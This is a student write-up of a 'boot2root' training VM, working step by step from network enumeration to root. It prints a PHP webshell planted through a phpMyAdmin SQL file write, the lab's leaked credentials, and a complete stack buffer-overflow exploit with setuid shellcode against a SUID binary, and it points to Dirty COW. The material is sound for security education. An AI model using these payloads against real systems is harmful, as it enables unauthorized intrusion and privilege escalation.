# boot2root

## Contents

- [Info](#info)
- [Writeups](#writeups)
    - [Writeup 1](#writeup-1)
        - [Emun](#enum)
        - [Forum](#forum)
        - [Webmail](#webmail)
        - [Phpmyadmin](#phpmyadmin)
        - [lmezard](#lmezard)
        - [laurie](#laurie)
        - [thor](#thor)
        - [zaz](#zaz)
    - [Writeup 2](#writeup-2)
- [Parrot](#parrot)

## Info

Project about multiple privilege escalations on Linux.

- Status: finished
- Result: 100%
- Observations: NULL

## Writeups

### Writeup 1

#### Enum

At first I found the password by exploiting the ISO, but I later found out
that's cheating, and we cannot exploit the ISO or grub, so here's an alternative
method.

Since the vm in is vbox I know the ip, but let's do this anyway, let's
suppose I don't know the ip. Create a `host-only` adapter for the machine,
so we can interact with it, and run `ifconfig`, search for the `vbox` adapter:
```bash
vboxnet0: flags=8943<UP,BROADCAST,RUNNING,PROMISC,SIMPLEX,MULTICAST> mtu 1500
	ether 0a:00:27:00:00:00
	inet 192.168.56.1 netmask 0xffffff00 broadcast 192.168.56.255
```

Now, let's do some host discovery in the entire network with ICMP Echo
and `nmap`:
```bash
# -PE: ICMP echo
# -sn: ping scan (disable port scan)
# /24: to scan the entire subnet
nmap -PE -sn 192.168.56.1/24

# Results
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-22 18:10 UTC
Nmap scan report for 192.168.56.1
Host is up (0.0032s latency).
Nmap scan report for 192.168.56.100
Host is up (0.0025s latency).
Nmap scan report for 192.168.56.101
Host is up (0.011s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.10 seconds
```

Three hosts are up, the `192.168.56.1` is the vbox gateway, and the
`192.168.56.100` is the vbox dhcpd (if I remeber correctly), so that leaves
us with only one IP, that's the server IP: `192.168.56.101`.

Let's run a full port scan on it:
```bash
# Split the scan in two phases (ports and scripts)
ports=$(nmap -p- --min-rate 1000 -T4 -Pn 192.168.56.101 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sV -sC -Pn 192.168.56.101

# Port results
21,22,80,143,443,993

# Scripts results
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-22 18:17 UTC
Nmap scan report for 192.168.56.101
Host is up (0.00063s latency).

PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hack me if you can
|_http-server-header: Apache/2.2.22 (Ubuntu)
143/tcp open  imap       Dovecot imapd
|_imap-capabilities: ENABLE LOGIN-REFERRALS OK more STARTTLS ID LITERAL+ SASL-IR have post-login listed capabilities LOGINDISABLEDA0001 IDLE IMAP4rev1 Pre-login
|_ssl-date: 2023-05-22T18:17:29+00:00; 0s from scanner time.
443/tcp open  ssl/http   Apache httpd 2.2.22
|_http-title: 404 Not Found
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
|_ssl-date: 2023-05-22T18:17:29+00:00; 0s from scanner time.
993/tcp open  ssl/imaps?
|_ssl-date: 2023-05-22T18:17:29+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.83 seconds
```

The web title is `Hack me if you can`, so let's try.

The web is not interesting, let's enumerate dirs quickly with `dirsearch`:
```bash
dirsearch -u 192.168.56.101

# Results
[18:41:55] 403 -  293B  - /.ht_wsr.txt
[18:41:56] 403 -  296B  - /.htaccess.bak1
[18:41:56] 403 -  298B  - /.htaccess.sample
[18:41:56] 403 -  296B  - /.htaccess.save
[18:41:56] 403 -  296B  - /.htaccess.orig
[18:41:56] 403 -  296B  - /.htaccess_orig
[18:41:56] 403 -  297B  - /.htaccess_extra
[18:41:56] 403 -  294B  - /.htaccess_sc
[18:41:56] 403 -  295B  - /.htaccessOLD2
[18:41:56] 403 -  294B  - /.htaccessBAK
[18:41:56] 403 -  287B  - /.html
[18:41:56] 403 -  296B  - /.htpasswd_test
[18:41:56] 403 -  286B  - /.htm
[18:41:56] 403 -  293B  - /.httr-oauth
[18:41:56] 403 -  292B  - /.htpasswds
[18:41:56] 403 -  294B  - /.htaccessOLD
[18:42:02] 403 -  290B  - /cgi-bin/
[18:42:03] 403 -  290B  - /doc/api/
[18:42:03] 403 -  301B  - /doc/en/changes.html
[18:42:03] 403 -  301B  - /doc/html/index.html
[18:42:03] 403 -  300B  - /doc/stable.version
[18:42:03] 403 -  286B  - /doc/
[18:42:04] 301 -  316B  - /fonts  ->  http://192.168.56.101/fonts/
[18:42:04] 403 -  287B  - /forum
[18:42:04] 403 -  288B  - /forum/
[18:42:04] 403 -  294B  - /forum/admin/
[18:42:04] 403 -  307B  - /forum/install/install.php
[18:42:05] 200 -    1KB - /index.html
[18:42:08] 403 -  295B  - /server-status
[18:42:08] 403 -  296B  - /server-status/
```

`dirsearch` is just a quick tool to get started while `ffuf` launch a bigger
attarck using `medium-2.3` wordlist (why? I used to compete for HTB first blood,
so it's an habit now):
```bash
ffuf -t 30 -w /usr/share/wordlists/directory-list-lowercase-2.3-big.txt -u http://192.168.56.101/FUZZ

# Results
forum                   [Status: 403, Size: 287, Words: 21, Lines: 11, Duration: 0ms]
fonts                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 2ms]
server-status           [Status: 403, Size: 295, Words: 21, Lines: 11, Duration: 0ms]
```
```bash
ffuf -t 30 -w /usr/share/wordlists/directory-list-lowercase-2.3-big.txt -u https://192.168.56.101/FUZZ

# Results
forum                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 3ms]
webmail                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 20ms]
phpmyadmin              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 298ms]
server-status           [Status: 403, Size: 296, Words: 21, Lines: 11, Duration: 3ms]
```

#### Forum

Let's start with the forum, we get a 403 using `http`, but we can access it via
`https://192.168.56.101/forum`.

Looking at the posts author we can extract some users `admin`, `lmezard`,
`qudevide`, `zaz`, `wandre` and `thor`.

The post `https://192.168.56.101/forum/index.php?id=6` from `lmezard` is
interesting, it contains what seems like a `sys.log` or `auth.log` most likely.

We find some valid users: `lmezard`, `root`, `admin`.

And a invalid user, that seems like a password: `!q\]Ej?*5K5cy*AJ`.

I login in the forum onto the user `lmezard` with it.

Our account email is `laurie@borntosec.net `, interesting maybe.

We can also go to the user area `https://192.168.56.101/forum/index.php?mode=user`,
and send emails to each user, if we try to send an email to `admin`, we see
its email is the same as us, not a surprise, since `lmezard` posted the `auth.log`,
it was already clear it was the admin. The other users don't have an email.

After further investigation there is nothing more in the forum, time to
enumerate another service.

#### Webmail

I started with the `webmail` because we have an email and a password, and
indeed, the `laurie@borntosec.net:!q\]Ej?*5K5cy*AJ` credentials worked.

We have two emails, in one of them we find creds for the db: `root:Fg-'kKXBj87E:aJ$`.

#### Phpmyadmin

We connect to `https://192.168.56.101/phpmyadmin/` with them.

Let's try to connect from the terminal with a client:
```bash
apt install default-mysql-client
mysql -h 192.168.56.101 -u root -p"Fg-'kKXBj87E"':aJ$`'
```

But we fail, so let's find another way.

I tried to upload a reverse shell via phpmyadmin `SQL` panel, which lets us
run querys, but I struggle finding a dir, after some search I enumerate
`https://192.168.56.101/forum` with `dirsearch` and found some dirs:
- `images`.
- `includes`
- `js`
- `lang`
- `modules`
- `themes`
- `templates_c`
- `update`

And it worked on the `templates_c` dir:
```sql
SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/forum/templates_c/shell.php';
```

Now, we can access the webshell via: `https://192.168.56.101/forum/templates_c/shell.php`,
and use it like so:
```raw
https://192.168.56.101/forum/templates_c/shell.php?cmd=id
```

We see we're the `www-data` user, and after some enum we find a `LOOKATME` file
on `/home`:
```raw
https://192.168.56.101/forum/templates_c/shell.php?cmd=ls%20/home
# Results
LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
```

```raw
https://192.168.56.101/forum/templates_c/shell.php?cmd=ls%20/home/LOOKATME
# Results
password
```

```raw
https://192.168.56.101/forum/templates_c/shell.php?cmd=cat%20/home/LOOKATME/password
# Results
lmezard:G!@M6f4Eatau{sF"
```

Oh! Credential!

#### lmezard

We can't login via `ssh`, we `ftp` is working (I needed to connect using
passive mode: `-p`):
```bash
ftp -p 192.168.56.101
Name: lmezard
Password: G!@M6f4Eatau{sF"

ftp> ?
ftp> ls
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
ftp> get README
ftp> get fun
ftp> quit
```

The `README` says that we need to complete a "little" challenge, and we will
be able to login as `laurie` via `ssh` with the result.

Untar `fun`:
```bash
tar -xf fun -C /dev/shm
cd /dev/shm/ft_fun
```

There are a lot of `pcap` files, let's try `strings`:
```bash
strings * | less
```

We find a lot of `printf("Hahahaha Got you!!!\n");`, and a lot of
`} void useless() {` strings, but other strings got my attention:
```c
char getme10() {
    return 'a';
}
```

It seems to me like there are at least 10 `getme` functions, eachone returning
a character, probably of the `laurie` password, so let's grep for those
functions:
```bash
# The function `getme` seems to have a line for the `return`, in `grep` you can
# use `-B n` to set how many lines print before the match and `-A n` for the
# number of lines after the match, so we can `grep` for `getme` and print one
# line below each time
cat * | grep -A 1 'getme' | less
```

This is what we got:
```raw
//file431char getme4() {

--
//file373char getme7() {

//file736char getme1() {

--
//file668char getme5() {

--
//file722char getme6() {

--
//file138char getme3() {

--
char getme8() {
    return 'w';
--
char getme9() {
    return 'n';
--
char getme10 {
    return 'a';
--
char getme11() {
    return 'g';
--
char getme12
{
--
    printf("%c",getme1());
    printf("%c",getme2());
    printf("%c",getme3());
    printf("%c",getme4());
    printf("%c",getme5());
    printf("%c",getme6());
    printf("%c",getme7());
    printf("%c",getme8());
    printf("%c",getme9());
    printf("%c",getme10());
    printf("%c",getme11());
    printf("%c",getme12());
    printf("\n");
--
//file632char getme2() {
```

We notice that each `pcap` ends with a comment `//fileXX` that indicates
probably the order, so let's make a program to sort them and then displays them
in the correcd order.

The file is in: `./scripts/pcap_sorter.cc`, it will sort and print the files
in the correct order, compile it and run it
(it will expect the directory `./ft_fun`):
```bash
g++ -std=c++17 main.cc
./a.out > source.c
gcc source.c
./a.out
```

And that gives us:
```raw
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

Let's obey and do it:
```bash
echo -n 'Iheartpwnage' | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

#### laurie

Let's login as `laurie`.

The challenge of this user is the `bomb` binay, let's run to see what it does:
```bash
laurie@BornToSecHackMe:~$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!

foo

BOOM!!!
The bomb has blown up.
```

And we have some hint in the `README`:
```raw
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

By reversing the binary and running some gdb, which I will not exploin, we
find that the phase 1 is just expecting some literal string:
```raw
Public speaking is very easy.
```

Passed, phase 2 is more complex, it expects 6 numbers, it runs
`sscanf("%d %d %d %d %d %d", ...)`, and then checks that the first number is
`1`, and for the other 5 numbers, it expects this:
```raw
n      == current number
index  == index of the number
prev_n == previus number

n == index * prev_n
```

For the sequence `1 2 3 4 5 6`, it will check (skipping the first number, which
must be `1`):
```c
2 == 2 * 1
3 == 3 * 2 // KO
4 == 4 * 3 // KO
5 == 5 * 4 // KO
6 == 6 * 5 // KO
```

A little thinking gives us the following equation, just keep resolving it
for 5 numbers, that will be our sequence:
```c
2 == 2 * 1
? == 3 * 2
```
```c
2   == 2 * 1
6   == 3 * 2
24  == 4 * 6
120 == 5 * 24
720 == 6 * 120
```

Seems good, and indeed, the following sequence worked for phase 2:
```raw
1 2 6 24 120 720
```

It worked! I also notice we can create a file and pass it as a parameter, so
`bomb` will read for it and when it ends it change to `stdin`, whichi means
we can save there what we have until know, so when we execute `bomb` we
start in the phase we ane currently in:
```bash
echo 'Public speaking is very easy.' > defuse
echo '1 2 6 24 120 720' >> defuse

./bomb ./defuse
```

Let's go whith phase 3, it seems this phase runs `sscanf("%d %c %d")`, and
then it has varius cases depending on the value of the first `%d`.

But, in short, it will expect a specific `%c` and `%d` on each case, let's
focus on only one, the first one, which is with if the first `%d == 0`.

It will check that the other `%d == 777`, and it will save a `'q'` in a local
variable, to later check that `%c == local_variable`, so the payload will be:
```raw
0 q 777
```

Save it in the `./defuse` file and let's continue with phase 4.

This phase runs `sscanf("%d")`, it explodes if the `value < 1`, and
then it calls a function passing it as parameter, and expects the return to
be `55`, or it explodes. So, we know our value must be `>= 1`.

That mysterious function is recursive, and it does something in the lines of:
```c
int function(int n)
{
    int n1;
    int n2;

    if (n < 2) {
        n2 = 1;
    } else {
        n1 = function(n - 1);
        n2 = function(n - 2);
        n2 = n2 + n1;
    }
    return n2;
}
```

So, I made a `./scripts/phase4.c` file that bruteforces this until it returns
`55`, the results is `9`. Add it to the `defuse` file.

Phase 5, this is getting harder... Let's break this phase down:
- It uses a custom `strlen` that works as expected, and checks our input has a length of `6`.
- Then it does an `AND <character>,15` for each character, and using the result as an index, it saves the corresping element from the array `"isrveawhobpnutfg"` in a local variable.
- Then it compares that local variable with `"giants"`, using a custom `strcmp`, that I hope is implemented as expected, because I don't want to check it.

We need to find a suitable string, let's make a program that finds it for us,
check it at `./scripts/phase5.c`.

The result string is:
```raw
o`ekma
```

Phase 6, the last phase, as expected, this one seems difficult.

It seems is reads 6 numbers with `sscanf("%d %d %d %d %d %d")`.

Later it makes a lot of checks, let's break them down:
- It iterates and checks that (being `n` the number):
    - If `n - 1 > 5` explodes, so `n` must be `n <= 6`.
    - It also checks that there are not duplicate numbers.
- It copies the values to a local array, but ff `n > 1` it does a lot of weird things with a global array a 2D int matrix.
- ...

So sorry, but knowing tha the hint is `4`, we know that's the first number, so
I'm just gonna bruteforce it.

Compile and launch `./scripts/phase6.c`, the resulting combination is:
```raw
Cracked: 4 2 6 3 1 5
```

As the subject suggest, the password of the next user (`thor`) is the
combination off all the solutions, so:
```raw
Public speaking is very easy.
1 2 6 24 120 720
0 q 777
9
o`ekma
4 2 6 3 1 5
```

Let's remove the spaces:
```raw
Publicspeakingisveryeasy.126241207200q7779o`ekma426315
```

But it didn't work, after some research I found out that, becasue two levels
solution can vary, one is the phase 3, were multiple inputs are valid, but
if we look at the `hints` file, the valid input contains a `b`, I was doing the
`q` case, so the valid answer is:
```raw
1 b 214
```

Now, the password should work:
```raw
Publicspeakingisveryeasy.126241207201b2149o`ekma426315
```

But, no, the phase 5 also have multiple valid answer, the expected one was:
```bash
opekmq
```

And phase 6 also has another valid answer it seems, we just need to swap `3` and `1`:
```raw
4 2 6 1 3 5
```

So, let's change our password one more time:
```raw
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

I do not like this project at all, the phase 3 variation was okey because
the `hint` helped, but the phase 5 and phase 6 multiple solutions can't be
justified.

#### thor

This one is easy, I'm not proud of where I came from, but I came from python
and C#, and this seems like `turtle`s instructions!

So, because I'm now proud of where I am, I'm of course gonna make all the
programs in C or C++, with no exception, so, I created a C++ program that
will parse a file like the one we are given, and generates a `.py` script
with `turtle`, that we can run.

The program is located at `./scripts/turtle_parser.cc`, just run it with
the file as first parameter. We'll need to retrieve the file from the machine
becouse we can't run a graphics program like `turtle` in it:
```bash
cd ./scripts
./recv thor turtle
g++ turtle_parser.cc -o turtle_parser
./turtle_parser ./files/turtle out.py

python3 ./out.py
```

The drawing is a bit strange, let's try to identify the letters one by one while
it's drawing them.

The resulting word is:
```raw
SLASH
```

The `turtle` file also tells us to "digest" the message
(MD5 is a "message-digest" algo):
I spent I while, but eventually I figure that like a previus user, the actual
password is `SLASH` hashed:
```raw
echo -n 'SLASH' | md5sum
```

#### zaz

The `mail` files are empty, let's check the `exploit_me` binary, that is owned
by `root` and has the `SUID` bit.

I tried a large input and it segfaulted, so it's seems like a BOF.
```bash
zaz@BornToSecHackMe:~$ ./exploit_me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped
```

It's a pretty simple binary, it was easy to reverse, this is the source code:
```c
int main(int argc,char **argv)
{
	char buff[140];

	if (argc > 1) {
		strcpy(buff, argv[1]);
		puts(buff);
	}
	return (int)(argc < 2);
}
```

So yeah... It's a simple BOF, that `strcpy` is sus.

Let's do the usual, open it with `gdb` and send a pattern payload large enought
to overflow `buff`:
```bash
gdb -q ./exploit_me
r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
```

Let's calculate the offset, remember the OS is little endian, so `0x37654136`
would be: `6Ae7`. That's `140` offset, we could have guessed that of course,
but I prefer to be sure.

So, get some [shellcode](https://shell-storm.org/shellcode/files/shellcode-752.html),
export it in a env variable with a `nop` sled of course, and compile our
`./scripts/getaddr.c` to get the env variable address.

I will use this [shellcode](https://shell-storm.org/shellcode/files/shellcode-251.html)
instead because it sets the `uid` and `gid` to the `euid` and `egid`.

```bash
#export SC=$(python -c "print '\x90'*100+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
# This payload stes
export SC=$(python -c "print '\x90'*100+'\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'")

gcc getaddr.c -o getaddr
./getaddr SC
# SC address: 0xXXXXXXXX
```

Forge the payload:
- `140` offset bytes.
- Shellcode address in little-endian.

```bash
# SC address: 0xbffffeb3
./exploit_me $(python -c "print 'A'*140+'\xb3\xfe\xff\xbf'")
```

And there we go:
```bash
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),1005(zaz)
```

### Writeup 2

Dirty COW, I doubt this is intended, it's probably just because of the years,
but... Is vulnerable, take the `./scripts/dirtycow.c`, and just run:
```bash
gcc dirtycow.c -lpthread -lcrypt
./a.out
su firefart
```

We could also exploit `grub`, but the subjects do not let us do so.

### Writeup 3

```bash
https://www.exploit-db.com/download/33824
```

## Parrot

I used the following docker most of the time:
```bash
docker run --rm -ti --network host -v $PWD:/host parrotsec/security
```

On the docker:
```bash
apt update
apt install vim python3-pip
python3 -m pip install pwntools
```
